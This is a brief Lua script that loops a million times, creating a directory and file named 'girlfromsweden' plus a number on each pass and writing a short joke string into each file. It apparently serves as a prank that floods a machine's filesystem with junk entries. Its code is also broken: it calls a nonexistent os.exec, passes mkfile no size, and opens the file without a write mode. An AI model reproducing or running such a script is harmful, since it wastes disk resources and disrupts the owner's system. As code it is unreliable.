for i = 1, 1000000 do
	coroutine.wrap(function()
		local name = 'girlfromsweden' .. i
		
		os.exec('mkdir ' .. name)
		os.exec('mkfile ' .. name)
		
		local path = ('%s/%s'):format(name, name)
		local file = io.open(path)
			
		file:write('girl from sweden - nico')
		file:close()
	end)()
end
